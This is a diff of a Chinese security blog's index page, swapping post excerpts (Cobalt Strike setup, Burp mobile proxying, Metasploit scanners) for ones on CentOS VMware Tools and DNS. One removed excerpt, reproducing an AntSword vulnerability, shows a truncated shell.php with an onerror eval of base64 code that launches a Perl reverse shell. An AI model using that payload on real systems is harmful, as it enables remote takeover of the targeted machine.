@@ -346,55 +346,33 @@
     
     
     <article class="index-post">
-        <a class="abstract-title" href="/2019/05/23/hello-world/">
+        <a class="abstract-title" href="/2018/12/16/LINUX-centos7-vmtools-安装/">
             
-                <span>Hello World</span>
+                <span>LINUX centos7 vmtools 安装</span>
         </a>
         <div class="abstract-content">
-            Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.
-Quick StartCreate a new post1$ hexo new "My New Post"
-More info: Writing
-Run server1$ hexo server
-More...
+            如何在centos7上安装VMtools 首先点左右上角虚拟机目录下的安装vmtools  然后桌面会出现一个vmtools光盘  右键打开vmtools光盘 把 VMwareTools-10.3.2-9925305.tar.gz 复制到Home文件夹下 （光盘内文件为只读不可直接解压） 打开home文件夹 右键打开终端先用 
+
+ # ls 
+
+查看一下 home目录下是否有 VMwareTools-10.3.2-9925305.tar.gz文件tar用法如下然后输入 
+
+#tar -xzf VMwareTools-10.3.2-9925305.tar.gz  
+
+然后输入 
+
+# cd...
         </div>
         <div class="abstract-post-meta">
             <!-- date  -->
             <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/05/23</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/04/17/antsword/">
-            
-                <span>antsword蚁剑</span>
-        </a>
-        <div class="abstract-content">
-            antsword 反弹shell的复现
-首先下载软件和源码（受影响源码为2.7）
-我这里用了两台linux虚拟机复现（Ubuntu和centos7）
-1，先用centos7搭一个php环境，然后把shell.php丢进去
-​    shell.php内容为：
-123456789```&lt;?phpheader("HTTP/1.1 406 Not &lt;img src=# onerror='eval(new Buffer(`cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ3BlcmwgLWUgXCd1c2UgU29ja2V0OyRpPSIxOTIuMT...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/04/17</span>
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/12/16</span>
             </div>
             <!-- tags  -->
             
             <div class="abstract-tags">
     
-        <a class="post-tag" href="javascript:void(0);" data-tags="repetition">repetition</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags="LINUX">LINUX</a>
     
 </div>
             
@@ -407,160 +385,32 @@ More...
     
     
     <article class="index-post">
-        <a class="abstract-title" href="/2019/04/14/burp-mobile/">
+        <a class="abstract-title" href="/2018/12/15/LINUX-DNS-搭建/">
             
-                <span>burp_mobile</span>
+                <span>LINUX DNS 搭建</span>
         </a>
         <div class="abstract-content">
-            1,首先，打开burpsuite ，在option下增加一个代理规则
+            DNS相关信息
+1. 什么是DNS
 
-2，然后勾选你新建的规则，
+DNS（Domain Name System，域名系统），万维网上作为域名和IP地址相互映射的一个分布式数据库，能够使用户更方便的访问互联网，而不用去记住能够被机器直接读取的IP数串。通过域名，最终得到该域名对应的IP地址的过程叫做域名解析（或主机名解析）。
 
-3，要确保你的手机和电脑是在同一个wifi下，然后点击wifi，修改WiFi的设置，添加手动代理
+2. DNS的功能
 
-4，然后用浏览器访问http://burp/
+每个IP地址都可以有一个主机名，主机名由一个或多个字符串组成，字符串之间用小数点隔开。有了主机名，就不要死记硬背每台IP设备的IP地址，只要记住相对直观有意义的主机名就行了。这就是DNS协议的功能。主机名到IP地址的映射有两种方式：
 
-5,下载证书并导入，就可以抓https的了
-​                                                                                                                          
-
+1）静态映射，每台设备上都配置主机到...
         </div>
         <div class="abstract-post-meta">
             <!-- date  -->
             <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/04/14</span>
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/12/15</span>
             </div>
             <!-- tags  -->
             
             <div class="abstract-tags">
     
-        <a class="post-tag" href="javascript:void(0);" data-tags="BURP">BURP</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/04/13/Cobalt-Strike搭建和使用/">
-            
-                <span>Cobalt Strike搭建和使用</span>
-        </a>
-        <div class="abstract-content">
-            kali默认的java是openjdk的首先安装oracle-java导入公钥    apt-key adv –keyserver hkp://keyserver.ubuntu.com:80 –recv-keys EEA14886添加源deb http://ppa.launchpad.net/webupd8team/java/ubuntu trusty maindeb-src http://ppa.launchpad.net/webupd8team/java/ubuntu trusty main更新源    apt-get update开始安装     apt-get install o...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/04/13</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="KALI_freekill">KALI_freekill</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/04/10/python开http/">
-            
-                <span>python开http</span>
-        </a>
-        <div class="abstract-content">
-            
-
-PYTHON2​    python -m SimpleHTTPServer
-
-
-PYTHON3​    python3 -m http.server
-
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/04/10</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="PYTHON">PYTHON</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/03/20/python-screen-chinese/">
-            
-                <span>python识别字符串中是否存在中文</span>
-        </a>
-        <div class="abstract-content">
-            使用python查询字符串中是否含有中文字符，
-
-
-1234567891011def screen_chinese(text):   	\#判断字符串是否存在汉字的函数   	bool1=&apos;&apos;   	r = re.compile(u&apos;[\u4e00-\u9fa5]&apos;)   	str1 = r.search(text)   	if str1 :       	bool1 =True   	else:       	bool1 = False   	return bool1print(screen_chinese(text))
-
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/03/20</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="PYTHON_str_deal">PYTHON_str_deal</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/03/13/msf-scanner/">
-            
-                <span>msf_scanner</span>
-        </a>
-        <div class="abstract-content">
-            一：基于scanner/http/http_version发现HTTP服务二：基于scanner/smb/smb_version发现SMB服务三：基于scanner/ftp/ftp_version发现FTP服务四：基于scanner/discovery/arp_sweep发现内网存活主机五：基于scanner/discovery/udp_sweep发现内网存活主机
-
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/03/13</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="MSF">MSF</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags="LINUX">LINUX</a>
     
 </div>
             
@@ -568,6 +418,10 @@ PYTHON3​    python3 -m http.server
     </article>
     
     <!-- paginator  -->
+    
+    <nav class="page-nav">
+        <a class="extend prev" rel="prev" href="/archives/">&#60; PREV</a><a class="page-number" href="/archives/">1</a><span class="page-number current">2</span>
+    </nav>
     
 </main>
             <!-- profile -->
